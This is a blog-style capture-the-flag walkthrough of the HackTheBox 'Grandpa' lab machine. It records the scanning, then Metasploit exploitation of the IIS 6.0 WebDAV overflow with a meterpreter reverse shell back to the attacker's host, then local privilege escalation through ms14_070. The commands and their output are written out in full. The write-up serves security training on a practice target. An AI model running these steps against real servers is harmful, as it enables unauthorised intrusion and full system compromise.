---
layout: page
title: Grandpa
description: Grandpa from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/grandpa/logo.png" title="HTB Grandpa Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/Grandpa">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Up for spending a little time with Grandpa.

Run nmap to get a list of available ports.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/grandpa]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.14    
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 17:56 AEDT
Nmap scan report for 10.10.10.14
Host is up (0.014s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Wed, 29 Jan 2025 06:56:52 GMT
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  WebDAV type: Unknown
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_xp cpe:/o:microsoft:windows_2000::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2003 SP1 (91%), Microsoft Windows Server 2003 SP1 or SP2 or Windows XP SP1 (91%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (90%), Microsoft Windows 2000 SP3/SP4 or Windows XP SP1/SP2 (88%), Microsoft Windows XP SP2 or SP3 (88%), Microsoft Windows XP SP3 (88%), Microsoft Windows XP SP2 or SP3, or Windows Embedded Standard 2009 (88%), Microsoft Windows 2000 Server SP4 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   17.49 ms 10.10.16.1
2   17.66 ms 10.10.10.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.29 seconds
```
{% endraw %}

<br />
Run nmap against all of the ports to see if there are any pesky hidden services.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/grandpa]
└─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.14   
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 17:58 AEDT
Nmap scan report for 10.10.10.14
Host is up (0.021s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 126.20 seconds
```
{% endraw %}

<br />
Run ffuf to try and brute-force any interesting directories or files.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/grandpa]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.14/FUZZ -e .txt,.bak,.asp -fw 131

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.14/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .txt .bak .asp 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 131
________________________________________________

images                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 44ms]
Images                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 30ms]
IMAGES                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 19ms]
_private                [Status: 403, Size: 1529, Words: 173, Lines: 30, Duration: 52ms]
:: Progress: [882236/882236] :: Job [1/1] :: 1315 req/sec :: Duration: [0:10:41] :: Errors: 0 ::
```
{% endraw %}

<br />
Run the nikto vulnerability scanner to see what it says.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/grandpa]
└─$ nikto -h http://10.10.10.14 -o nikto.txt
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.10.14
+ Target Hostname:    10.10.10.14
+ Target Port:        80
+ Start Time:         2025-01-29 18:10:42 (GMT11)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ /: Retrieved microsoftofficewebserver header: 5.0_Pub.
+ /: Retrieved x-powered-by header: ASP.NET.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /8qY81XYZ.axd: Retrieved x-aspnet-version header: 1.1.4322.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH .
+ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ OPTIONS: Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH .
+ HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ OPTIONS: WebDAV enabled (UNLOCK PROPFIND PROPPATCH SEARCH MKCOL LOCK COPY listed as allowed).
+ /: PROPFIND HTTP verb may show the server's internal IP address: http://10.10.10.14/. See: https://docs.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2003/aa142960(v%3Dexchg.65)
+ /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0709
+ /postinfo.html: Microsoft FrontPage default file found. See: CWE-552
+ /_vti_bin/shtml.exe/_vti_rpc: FrontPage may be installed. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage
+ /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information). See: https://en.wikipedia.org/wiki/Microsoft_FrontPage
+ /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376
+ /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0114
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ /_vti_bin/_vti_adm/admin.exe: FrontPage/Sharepointfile available.
+ /_vti_bin/_vti_aut/author.exe: FrontPage/Sharepointfile available.
+ /_vti_bin/_vti_aut/author.dll: FrontPage/Sharepointfile available.
+ 8046 requests: 0 error(s) and 26 item(s) reported on remote host
+ End Time:           2025-01-29 18:14:55 (GMT11) (253 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
{% endraw %}

<br />
Open msfconsole and search for the microsoft iis 6 that was indicated as the IIS version in the nmap results.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/grandpa]
└─$ msfconsole -q
msf6 > search microsoft iis 6.0

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  auxiliary/dos/windows/http/ms10_065_ii6_asp_dos      2010-09-14       normal  No     Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service
   1  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl
```
{% endraw %}

<br />
Choose to use the exploit/windows/iis/iis_webdav_scstoragepathfromurl option.  You can choose this by just using use 1 (or whatever number it is for you).

{% raw %}
```sh
msf6 > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) >
```
{% endraw %}

<br />
Show the options available for the exploit and set the LHOST and RHOSTS options.  Set LHOST to the tun0 interface IP address and set RHOST to Grandpa's IP.  Run the exploit.

{% raw %}
```sh
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set lhost tun0
lhost => 10.10.16.12
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set lhost tun0
lhost => 10.10.16.12
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set rhosts 10.10.10.14
rhosts => 10.10.10.14
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
[*] Started reverse TCP handler on 10.10.16.12:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (177734 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.16.12:4444 -> 10.10.10.14:1030) at 2025-01-29 21:48:20 +1100

meterpreter > 
```
{% endraw %}

<br />
Run ps to get a list of running process and migrate to a process that belongs to our user.

{% raw %}
```sh
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   272   csrss.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 580   392   svchost.exe
 668   392   svchost.exe
 732   392   svchost.exe
 768   392   svchost.exe
 788   392   svchost.exe
 924   392   spoolsv.exe
 952   392   msdtc.exe
 1064  392   cisvc.exe
 1112  392   svchost.exe
 1168  392   inetinfo.exe
 1204  392   svchost.exe
 1308  392   VGAuthService.exe
 1380  392   vmtoolsd.exe
 1492  392   svchost.exe
 1588  392   svchost.exe
 1764  392   dllhost.exe
 1936  392   alg.exe
 1964  580   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 2252  580   wmiprvse.exe
 3408  1492  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3480  580   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 3528  3408  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe

meterpreter > migrate 3480
[*] Migrating from 3528 to 3480...
[*] Migration completed successfully.
```
{% endraw %}

<br />
Background the session and search for local_exploit_suggester.

{% raw %}
```sh
meterpreter > 
Background session 1? [y/N]  y
[-] Unknown command: y. Run the help command for more details.
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
```
{% endraw %}

<br />
Use the local_exploit_suggester option and show the options.

{% raw %}
```sh
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.
```
{% endraw %}

<br />
Set the session to the session number from the meterpreter session that we established earlies.  Run the exploit.

{% raw %}
```sh
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit
[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 202 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.10.10.14 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.

<snip>

[*] Post module execution completed
```
{% endraw %}

<br />
Select the ms14_070_tcpip_ioctl exploit and show the options for that exploit.

{% raw %}
```sh
msf6 exploit(windows/local/ms14_058_track_popup_menu) > use exploit/windows/local/ms14_070_tcpip_ioctl
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > show options

Module options (exploit/windows/local/ms14_070_tcpip_ioctl):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Server 2003 SP2



View the full module info with the info, or info -d command.
```
{% endraw %}

<br />
Set the options for the exploit and run the exploit.

{% raw %}
```sh
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set session 1
session => 1
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set lhost tun0
lhost => 10.10.16.12
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set lhost tun0
lhost => 10.10.16.12
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > exploit
[*] Started reverse TCP handler on 10.10.16.12:4444 
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Sending stage (177734 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.16.12:4444 -> 10.10.10.14:1031) at 2025-01-29 23:53:57 +1100

meterpreter >
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```sh
C:\Documents and Settings\Harry\Desktop>type user.txt
type user.txt
<redacted>
C:\Documents and Settings\Harry\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IP Address. . . . . . . . . . . . : 10.10.10.14
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```sh
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
<redacted>
C:\Documents and Settings\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IP Address. . . . . . . . . . . . : 10.10.10.14
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
```
{% endraw %}

<br />
And with that we wrap up this box.  See you in the next one.